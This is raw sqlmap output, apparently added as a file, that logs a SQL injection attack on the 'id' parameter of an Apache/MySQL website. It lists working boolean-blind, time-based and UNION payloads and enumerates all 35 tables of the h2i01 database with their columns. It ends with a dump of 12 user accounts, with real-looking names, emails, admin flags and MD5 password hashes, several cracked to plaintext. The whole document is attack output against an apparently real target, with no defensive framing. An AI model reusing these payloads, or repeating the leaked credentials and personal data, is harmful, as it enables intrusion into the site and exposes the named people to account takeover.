@@ -1,0 +1,768 @@
+sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=97 AND 5824=5824
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=97 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=97 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a6a6a71,0x736957487743574459764763425a71716162546f4e4c72714567515953674b704d7071744b4c4f6a,0x7162626b71)-- maRa
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] h2i01
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=97 AND 5824=5824
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=97 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=97 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a6a6a71,0x736957487743574459764763425a71716162546f4e4c72714567515953674b704d7071744b4c4f6a,0x7162626b71)-- maRa
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: h2i01
+[35 tables]
++------------------------+
+| cadastro_revenda       |
+| cliente                |
+| clientes               |
+| contato                |
+| email_cadastro_revenda |
+| email_rh               |
+| evento_fotos           |
+| eventos                |
+| faq                    |
+| garantia               |
+| garantia_fabricante    |
+| garantia_h2i           |
+| imagens_sobre          |
+| parceiros              |
+| proc_padrao            |
+| produtos               |
+| rh                     |
+| rma                    |
+| rma_2                  |
+| rma_dev_mercadoria     |
+| sc_log                 |
+| seg_apps               |
+| seg_groups             |
+| seg_groups_apps        |
+| seg_users              |
+| seg_users_groups       |
+| sobre                  |
+| tab_estatistica        |
+| tab_fabricante         |
+| tab_garantia_total     |
+| tab_perfil             |
+| tab_produtos           |
+| tabela_garantia        |
+| tabela_preco           |
+| usuarios               |
++------------------------+
+
+Database: h2i01
++------------------------+---------+
+| Table                  | Entries |
++------------------------+---------+
+| sc_log                 | 56084   |
+| cadastro_revenda       | 5748    |
+| produtos               | 3272    |
+| cliente                | 1269    |
+| evento_fotos           | 525     |
+| rh                     | 405     |
+| seg_groups_apps        | 378     |
+| tabela_garantia        | 331     |
+| tab_produtos           | 157     |
+| tab_fabricante         | 145     |
+| seg_apps               | 63      |
+| imagens_sobre          | 25      |
+| proc_padrao            | 24      |
+| eventos                | 23      |
+| garantia_fabricante    | 17      |
+| clientes               | 16      |
+| garantia_h2i           | 15      |
+| parceiros              | 15      |
+| faq                    | 13      |
+| seg_users              | 12      |
+| seg_users_groups       | 12      |
+| tab_garantia_total     | 11      |
+| seg_groups             | 6       |
+| usuarios               | 6       |
+| garantia               | 4       |
+| tab_perfil             | 4       |
+| rma                    | 3       |
+| tab_estatistica        | 3       |
+| email_rh               | 2       |
+| contato                | 1       |
+| email_cadastro_revenda | 1       |
+| rma_2                  | 1       |
+| rma_dev_mercadoria     | 1       |
+| sobre                  | 1       |
+| tabela_preco           | 1       |
++------------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=97 AND 5824=5824
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=97 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=97 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a6a6a71,0x736957487743574459764763425a71716162546f4e4c72714567515953674b704d7071744b4c4f6a,0x7162626b71)-- maRa
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: h2i01
+[35 tables]
++------------------------+
+| cadastro_revenda       |
+| cliente                |
+| clientes               |
+| contato                |
+| email_cadastro_revenda |
+| email_rh               |
+| evento_fotos           |
+| eventos                |
+| faq                    |
+| garantia               |
+| garantia_fabricante    |
+| garantia_h2i           |
+| imagens_sobre          |
+| parceiros              |
+| proc_padrao            |
+| produtos               |
+| rh                     |
+| rma                    |
+| rma_2                  |
+| rma_dev_mercadoria     |
+| sc_log                 |
+| seg_apps               |
+| seg_groups             |
+| seg_groups_apps        |
+| seg_users              |
+| seg_users_groups       |
+| sobre                  |
+| tab_estatistica        |
+| tab_fabricante         |
+| tab_garantia_total     |
+| tab_perfil             |
+| tab_produtos           |
+| tabela_garantia        |
+| tabela_preco           |
+| usuarios               |
++------------------------+
+
+Database: h2i01
+Table: email_cadastro_revenda
+[3 columns]
++--------+-------------+
+| Column | Type        |
++--------+-------------+
+| email  | varchar(50) |
+| ID     | int(11)     |
+| nome   | varchar(50) |
++--------+-------------+
+
+Database: h2i01
+Table: tab_fabricante
+[2 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| cod_fabricante | int(6)       |
+| descricao      | varchar(100) |
++----------------+--------------+
+
+Database: h2i01
+Table: produtos
+[20 columns]
++----------------+---------------+
+| Column         | Type          |
++----------------+---------------+
+| cod_grupo      | varchar(20)   |
+| cod_produto    | varchar(20)   |
+| custo_produto  | varchar(20)   |
+| descricao      | text          |
+| ean            | varchar(50)   |
+| est            | varchar(20)   |
+| id             | int(5)        |
+| imagem         | varchar(255)  |
+| margem_produto | varchar(20)   |
+| ncm            | varchar(50)   |
+| nome_grupo     | varchar(80)   |
+| nome_produto   | varchar(100)  |
+| preco1         | decimal(10,4) |
+| preco2         | decimal(10,4) |
+| preco3         | decimal(10,4) |
+| preco4         | decimal(10,4) |
+| preco5         | decimal(10,4) |
+| prod_destaque  | int(2)        |
+| status         | varchar(1)    |
+| tipo_produto   | varchar(20)   |
++----------------+---------------+
+
+Database: h2i01
+Table: rma
+[10 columns]
++-------------------------+------+
+| Column                  | Type |
++-------------------------+------+
+| cadastro_PF             | text |
+| cadastro_PJ             | text |
+| condicoes_troca_24horas | text |
+| decl_autonomo           | text |
+| garantia                | text |
+| modelo_PF               | text |
+| modelo_PJ               | text |
+| politica_RMA            | text |
+| regras_dev_mercadoria   | text |
+| rma_transportadora      | text |
++-------------------------+------+
+
+Database: h2i01
+Table: clientes
+[12 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| cnpj_cpf         | varchar(20)  |
+| cod_cliente      | int(20)      |
+| cod_unidade      | int(5)       |
+| data_atualizacao | datetime     |
+| email_contato    | varchar(100) |
+| id               | int(5)       |
+| nome_fantasia    | varchar(200) |
+| razao_social     | varchar(200) |
+| senha            | varchar(20)  |
+| status           | varchar(1)   |
+| tipo_atividade   | int(11)      |
+| usuario          | varchar(30)  |
++------------------+--------------+
+
+Database: h2i01
+Table: parceiros
+[5 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| destaque | int(11)     |
+| ID       | int(11)     |
+| nome     | varchar(25) |
+| ordem    | int(3)      |
+| url      | varchar(25) |
++----------+-------------+
+
+Database: h2i01
+Table: usuarios
+[6 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| cod_perfil   | varchar(20)  |
+| email        | varchar(500) |
+| id           | int(4)       |
+| nome_usuario | varchar(100) |
+| senha        | char(255)    |
+| usuario      | varchar(255) |
++--------------+--------------+
+
+Database: h2i01
+Table: rma_dev_mercadoria
+[5 columns]
++--------------+------------+
+| Column       | Type       |
++--------------+------------+
+| dev_cf       | text       |
+| dev_nfe      | text       |
+| dev_pj_eppma | text       |
+| dev_pj_no    | text       |
+| id           | bigint(20) |
++--------------+------------+
+
+Database: h2i01
+Table: email_rh
+[5 columns]
++----------------+--------------+
+| Column         | Type         |
++----------------+--------------+
+| email          | varchar(100) |
+| form_contato   | varchar(1)   |
+| form_curriculo | varchar(1)   |
+| id             | bigint(20)   |
+| nome           | varchar(70)  |
++----------------+--------------+
+
+Database: h2i01
+Table: tabela_preco
+[21 columns]
++----------------------+-------------+
+| Column               | Type        |
++----------------------+-------------+
+| id                   | int(4)      |
+| preco_1              | varchar(50) |
+| preco_2              | varchar(50) |
+| preco_3              | varchar(50) |
+| preco_4              | varchar(50) |
+| preco_5              | varchar(50) |
+| qt_download_preco_1  | int(4)      |
+| qt_download_preco_2  | int(4)      |
+| qt_download_preco_3  | int(4)      |
+| qt_download_preco_4  | int(4)      |
+| qt_download_preco_5  | int(4)      |
+| ult_download_preco_1 | date        |
+| ult_download_preco_2 | date        |
+| ult_download_preco_3 | date        |
+| ult_download_preco_4 | date        |
+| ult_download_preco_5 | date        |
+| ult_upload_preco_1   | date        |
+| ult_upload_preco_2   | date        |
+| ult_upload_preco_3   | date        |
+| ult_upload_preco_4   | date        |
+| ult_upload_preco_5   | date        |
++----------------------+-------------+
+
+Database: h2i01
+Table: imagens_sobre
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| endereco | varchar(50) |
+| ID       | int(11)     |
+| unidade  | varchar(50) |
++----------+-------------+
+
+Database: h2i01
+Table: sobre
+[3 columns]
++-----------+---------+
+| Column    | Type    |
++-----------+---------+
+| id        | int(11) |
+| intro     | text    |
+| quemsomos | text    |
++-----------+---------+
+
+Database: h2i01
+Table: cadastro_revenda
+[39 columns]
++------------------+---------------+
+| Column           | Type          |
++------------------+---------------+
+| agencia_banco    | varchar(80)   |
+| bairro_empresa   | varchar(80)   |
+| cel_contato      | varchar(12)   |
+| cep_empresa      | varchar(80)   |
+| cidade_empresa   | varchar(80)   |
+| cnpj_cpf         | varchar(15)   |
+| cod_unidade      | varchar(20)   |
+| conta_banco      | varchar(30)   |
+| cpf_contato      | varchar(80)   |
+| data             | date          |
+| email_contato    | varchar(100)  |
+| endereco_banco   | varchar(80)   |
+| endereco_empresa | varchar(80)   |
+| fax_empresa      | char(12)      |
+| id               | int(5)        |
+| insc_estadual    | varchar(15)   |
+| insc_municipal   | varchar(15)   |
+| limite_credito   | decimal(10,2) |
+| nome_banco       | varchar(80)   |
+| nome_contato     | varchar(80)   |
+| nome_fantasia    | varchar(60)   |
+| observacao       | text          |
+| pais_empresa     | varchar(80)   |
+| razao_social     | varchar(80)   |
+| refer_contato    | varchar(50)   |
+| refer_contato2   | varchar(50)   |
+| refer_empresa    | varchar(80)   |
+| refer_empresa2   | varchar(80)   |
+| refer_telefone   | varchar(12)   |
+| refer_telefone2  | varchar(12)   |
+| rg_contato       | varchar(80)   |
+| senha_login      | char(8)       |
+| status           | varchar(10)   |
+| tel_contato      | varchar(12)   |
+| telefone_empresa | char(12)      |
+| tipo_cliente     | varchar(30)   |
+| titular_banco    | varchar(80)   |
+| uf               | varchar(80)   |
+| user_login       | varchar(20)   |
++------------------+---------------+
+
+Database: h2i01
+Table: seg_apps
+[3 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| app_name    | varchar(128) |
+| app_type    | varchar(255) |
+| description | varchar(255) |
++-------------+--------------+
+
+Database: h2i01
+Table: rh
+[9 columns]
++------------------+-------------+
+| Column           | Type        |
++------------------+-------------+
+| assunto          | varchar(50) |
+| data_recebimento | datetime    |
+| email            | varchar(75) |
+| endereco         | varchar(75) |
+| habilidades      | text        |
+| id               | int(6)      |
+| nome             | varchar(75) |
+| telefone         | varchar(15) |
+| visualizado      | int(1)      |
++------------------+-------------+
+
+Database: h2i01
+Table: eventos
+[6 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| data          | date         |
+| data_cadastro | date         |
+| id            | int(4)       |
+| imagem        | varchar(500) |
+| texto         | text         |
+| titulo        | varchar(200) |
++---------------+--------------+
+
+Database: h2i01
+Table: tab_garantia_total
+[2 columns]
++--------------+--------+
+| Column       | Type   |
++--------------+--------+
+| cod_garantia | int(6) |
+| descricao    | text   |
++--------------+--------+
+
+Database: h2i01
+Table: tabela_garantia
+[9 columns]
++---------------------+--------------+
+| Column              | Type         |
++---------------------+--------------+
+| cod_fabricante      | varchar(50)  |
+| garantia_fabricante | int(6)       |
+| garantia_h2i        | int(6)       |
+| garantia_total      | varchar(50)  |
+| id                  | int(6)       |
+| obs_uso_int         | text         |
+| observacoes         | text         |
+| procedimentos_troca | text         |
+| produtos            | varchar(100) |
++---------------------+--------------+
+
+Database: h2i01
+Table: faq
+[6 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| cod_tema      | int(5)       |
+| data_cadastro | datetime     |
+| id            | int(4)       |
+| ordem         | int(3)       |
+| texto         | text         |
+| titulo        | varchar(200) |
++---------------+--------------+
+
+Database: h2i01
+Table: seg_users_groups
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| group_id | int(11)     |
+| login    | varchar(32) |
++----------+-------------+
+
+Database: h2i01
+Table: proc_padrao
+[4 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| data_cadastro | datetime     |
+| id            | int(4)       |
+| texto         | text         |
+| titulo        | varchar(200) |
++---------------+--------------+
+
+Database: h2i01
+Table: garantia_h2i
+[2 columns]
++--------------+--------+
+| Column       | Type   |
++--------------+--------+
+| cod_garantia | int(6) |
+| descricao    | text   |
++--------------+--------+
+
+Database: h2i01
+Table: sc_log
+[8 columns]
++---------------+--------------+
+| Column        | Type         |
++---------------+--------------+
+| action        | varchar(30)  |
+| application   | varchar(200) |
+| creator       | varchar(30)  |
+| description   | text         |
+| id            | int(8)       |
+| inserted_date | datetime     |
+| ip_user       | varchar(32)  |
+| username      | varchar(90)  |
++---------------+--------------+
+
+Database: h2i01
+Table: tab_perfil
+[14 columns]
++----------------------+-------------+
+| Column               | Type        |
++----------------------+-------------+
+| cod_perfil           | int(11)     |
+| perfil_atualizarsite | int(1)      |
+| perfil_clientes      | int(1)      |
+| perfil_eventos       | int(1)      |
+| perfil_faq           | int(11)     |
+| perfil_garantia      | int(1)      |
+| perfil_importar_cli  | int(1)      |
+| perfil_importar_prod | int(1)      |
+| perfil_nome          | varchar(20) |
+| perfil_procpadrao    | int(1)      |
+| perfil_produtos      | int(1)      |
+| perfil_revenda       | int(1)      |
+| perfil_rh            | int(1)      |
+| perfil_usuarios      | int(1)      |
++----------------------+-------------+
+
+Database: h2i01
+Table: garantia
+[2 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| descricao | varchar(30) |
+| id        | bigint(20)  |
++-----------+-------------+
+
+Database: h2i01
+Table: seg_groups
+[2 columns]
++-------------+-------------+
+| Column      | Type        |
++-------------+-------------+
+| description | varchar(64) |
+| group_id    | int(11)     |
++-------------+-------------+
+
+Database: h2i01
+Table: rma_2
+[13 columns]
++---------------------+------------+
+| Column              | Type       |
++---------------------+------------+
+| cadastroPF          | text       |
+| cadastroPJ          | text       |
+| condicoes24Troca    | text       |
+| declAutonomo        | text       |
+| garantia            | text       |
+| id                  | bigint(20) |
+| modeloPF            | text       |
+| modeloPJ            | text       |
+| politica            | text       |
+| regrasautonomo      | text       |
+| regrasDevMercadoria | text       |
+| regraspreposto      | text       |
+| rmaTransportadora   | text       |
++---------------------+------------+
+
+Database: h2i01
+Table: tab_produtos
+[2 columns]
++-------------+--------+
+| Column      | Type   |
++-------------+--------+
+| cod_produto | int(6) |
+| descricao   | text   |
++-------------+--------+
+
+Database: h2i01
+Table: seg_users
+[7 columns]
++-----------------+-------------+
+| Column          | Type        |
++-----------------+-------------+
+| activation_code | varchar(32) |
+| active          | varchar(1)  |
+| email           | varchar(64) |
+| login           | varchar(32) |
+| name            | varchar(64) |
+| priv_admin      | varchar(1)  |
+| pswd            | varchar(32) |
++-----------------+-------------+
+
+Database: h2i01
+Table: tab_estatistica
+[8 columns]
++--------------------+-------------+
+| Column             | Type        |
++--------------------+-------------+
+| id                 | int(5)      |
+| tipo_estatistica   | varchar(20) |
+| valor1_estatistica | varchar(20) |
+| valor2_estatistica | varchar(20) |
+| valor3_estatistica | varchar(20) |
+| valor4_estatistica | varchar(20) |
+| valor5_estatistica | varchar(20) |
+| valor6_estatistica | varchar(20) |
++--------------------+-------------+
+
+Database: h2i01
+Table: contato
+[6 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| assunto          | varchar(70)  |
+| data_recebimento | date         |
+| email            | varchar(150) |
+| id               | bigint(20)   |
+| mensagem         | text         |
+| nome             | varchar(200) |
++------------------+--------------+
+
+Database: h2i01
+Table: seg_groups_apps
+[8 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| app_name    | varchar(128) |
+| group_id    | int(11)      |
+| priv_access | varchar(1)   |
+| priv_delete | varchar(1)   |
+| priv_export | varchar(1)   |
+| priv_insert | varchar(1)   |
+| priv_print  | varchar(1)   |
+| priv_update | varchar(1)   |
++-------------+--------------+
+
+Database: h2i01
+Table: evento_fotos
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| descricao | varchar(250) |
+| id        | bigint(20)   |
+| id_evento | int(11)      |
+| imagem    | varchar(100) |
++-----------+--------------+
+
+Database: h2i01
+Table: cliente
+[10 columns]
++--------------+--------------+
+| Column       | Type         |
++--------------+--------------+
+| cod_cliente  | varchar(20)  |
+| documento    | varchar(30)  |
+| email        | varchar(100) |
+| fantasia     | varchar(70)  |
+| id           | int(6)       |
+| nome         | varchar(70)  |
+| situacao     | varchar(1)   |
+| tipo_cliente | varchar(20)  |
+| tp_preco     | int(1)       |
+| unidade      | varchar(40)  |
++--------------+--------------+
+
+Database: h2i01
+Table: garantia_fabricante
+[2 columns]
++--------------+--------+
+| Column       | Type   |
++--------------+--------+
+| cod_garantia | int(6) |
+| descricao    | text   |
++--------------+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=97 AND 5824=5824
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=97 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=97 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a6a6a71,0x736957487743574459764763425a71716162546f4e4c72714567515953674b704d7071744b4c4f6a,0x7162626b71)-- maRa
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: h2i01
+Table: seg_users
+[12 entries]
++---------------------------------------------+----------------------------+-----------+-------------------------------+--------+------------+-----------------+
+| pswd                                        | name                       | login     | email                         | active | priv_admin | activation_code |
++---------------------------------------------+----------------------------+-----------+-------------------------------+--------+------------+-----------------+
+| 421996bed37bd97a6d9ab227b3aaba71            | Administrador              | admin     | guilherme@grwebs.com.br       | Y      | Y          | <blank>         |
+| ae91bb9c0993bd7352689c915c8947d5 (201192)   | Guilherme Ribeiro Assemany | guilherme | guilherme@grwebs.com.br       | Y      | <blank>    | <blank>         |
+| e10adc3949ba59abbe56e057f20f883e (123456)   | Ruy                        | ruy       | ruy@h2i.com.br                | Y      | <blank>    | <blank>         |
+| e9fee26f9f14d6b13e3cbbc2433372ba            | Joana MKT                  | MKT       | mkt@h2i.com.br                | Y      | <blank>    | <blank>         |
+| 89794b621a313bb59eed0d9f0f4e8205 (123mudar) | Rodrigo Dotto              | rodrigo   | rma@h2i.com.br                | Y      | <blank>    | <blank>         |
+| 367a0d0d5b8a44f7f72969ed80c04adf            | Raimundo Ti                | Raimundo  | ti2@h2i.com.br                | Y      | <blank>    | <blank>         |
+| ad49262becb89dd54192c256f8bf44f3            | Helio                      | helio     | helio@h2i.com.br              | Y      | <blank>    | <blank>         |
+| 764233d866b577256389042e4d1bcce1            | Guilherme Ribeiro Assemany | assemany  | guilhermeassemany@hotmail.com | Y      | <blank>    | <blank>         |
+| e10adc3949ba59abbe56e057f20f883e (123456)   | Guilherme                  | rhtest    | guiassemany@hotmail.com       | Y      | <blank>    | <blank>         |
+| d93591bdf7860e1e4ee2fca799911215 (4321)     | Vilmar Landulfo            | vilmar    | vilmar@h2i.com.br             | Y      | <blank>    | <blank>         |
+| d93591bdf7860e1e4ee2fca799911215 (4321)     | Juliana Brito              | juliana   | juliana@h2i.com.br            | Y      | <blank>    | <blank>         |
+| 3f3ce8d94f88d42322e7204f702c138f (leandro)  | Leandro Lima               | Leandro   | vilmar@h2i.com.br             | Y      | <blank>    | <blank>         |
++---------------------------------------------+----------------------------+-----------+-------------------------------+--------+------------+-----------------+
+
